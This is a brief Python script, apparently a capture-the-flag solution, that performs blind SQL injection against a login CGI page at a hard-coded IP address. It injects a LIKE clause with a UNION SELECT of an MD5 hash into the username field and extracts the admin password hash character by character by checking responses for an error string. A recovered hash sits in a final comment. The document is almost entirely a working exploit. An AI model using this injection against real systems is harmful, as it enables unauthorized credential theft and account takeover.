from requests import post

url = "http://54.222.248.100/cgi-bin/index.cgi"

data = "user=admin'and password like '{}%' union select 'c4ca4238a0b923820dcc509a6f75849b&pass=1&login=Login"

dic = "abcdef0123456789"
password = ""

for i in range(0, 64):
    for j in dic:
        data = "user=admin'and password like '{}%' union select 'c4ca4238a0b923820dcc509a6f75849b&pass=1&login=Login"
        data = data.format(password + j)
        res = post(url, data=data)
        # print res.content
        if 'Error!' in res.content:
            password += j
            print password
            break

# 63730edfab254f34761c17e89de28086